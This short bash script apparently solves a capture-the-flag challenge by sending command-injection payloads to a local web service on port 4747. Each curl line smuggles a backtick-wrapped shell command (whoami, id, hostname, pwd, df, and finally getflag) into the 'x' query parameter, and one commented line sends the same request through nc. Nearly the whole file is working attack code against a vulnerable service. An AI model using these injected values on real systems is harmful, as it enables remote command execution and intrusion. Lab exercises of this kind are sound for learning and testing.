#!/bin/bash
#
curl localhost:4747/?x="\`/usr/bin/whoami\`" 
curl localhost:4747/?x="\`/usr/bin/id\`" 
curl localhost:4747/?x="\`/bin/hostname\`" 
curl localhost:4747/?x="\`/bin/pwd\`" 
curl localhost:4747/?x="\`/bin/df\`" 
curl localhost:4747/?x="\`$(which pwd)\`" 🟢 

# solve
#echo -e "GET /?x=\`$(which getflag)\` HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4747
curl localhost:4747/?x="\`$(which getflag)\`"

